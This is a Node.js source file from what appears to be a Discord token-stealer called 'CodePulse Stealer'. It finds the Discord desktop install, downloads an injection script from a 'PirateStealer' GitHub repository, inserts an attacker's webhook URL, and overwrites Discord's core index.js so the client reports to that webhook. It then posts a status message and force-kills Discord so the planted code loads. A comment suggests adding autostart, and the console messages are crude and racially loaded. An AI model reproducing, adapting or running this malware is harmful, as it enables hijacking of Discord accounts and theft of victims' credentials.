const axios = require('axios');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execSync } = require('child_process');

const webhookUrl = "REPLACEMEWITHYOURWEBHOOK";
const localAppData = process.env.localappdata;

function injectDiscord() {
  const directories = fs.readdirSync(localAppData);
  for (let directory of directories) {
    if (directory.toLowerCase().includes('discord')) {
      const subdirectories = fs.readdirSync(path.join(localAppData, directory));
      for (let subdirectory of subdirectories) {
        if (/app-(\d*\.\d*)*/.test(subdirectory)) {
          const directoryPath = path.join(localAppData, directory, subdirectory);
          axios.get("https://raw.githubusercontent.com/6R-r/PirateStealer/main/src/injection/injection-clean.js") //axios is like requests in python it sends request and replaces webhook link with your in code i already commented golang code so i dont want to comment this one
            .then(response => {
              const injectionScript = response.data.replace("%WEBHOOK_LINK%", webhookUrl);
              const indexFilePath = path.join(directoryPath, 'modules', 'discord_desktop_core-1', 'discord_desktop_core', 'index.js');
              fs.writeFileSync(indexFilePath, injectionScript, 'utf-8');
              console.log("BLACK MENS LOADING...");
              return true;
            })
            .catch(error => {
              console.error(error);
              return false;
            });
        }
      }
    }
  }

  console.log("I LOVE BLACK MENS");
  return false;
}

function killDiscord() {
  const processes = execSync('tasklist').toString('utf-8');
  if (processes.includes("Discord.exe")) {
    execSync('taskkill /IM Discord.exe /F'); //btw y can add like autostart by running Update.exe yk 
  }
}

const embed = {
  "title": "Discord Injection - CodePulse Stealer",
  "color": 3447704,
  "fields": []
};

const injectionSuccessful = injectDiscord();

if (injectionSuccessful) {
  embed.fields.push({ "name": "Injection Status", "value": "Discord injection completed successfully.", "inline": false });
} else {
  embed.fields.push({ "name": "Injection Status", "value": "Discord injection failed.", "inline": false });
}

axios.post(webhookUrl, { "embeds": [embed] })
  .then(() => {
    killDiscord();
  })
  .catch((error) => {
    console.error(error);
  });
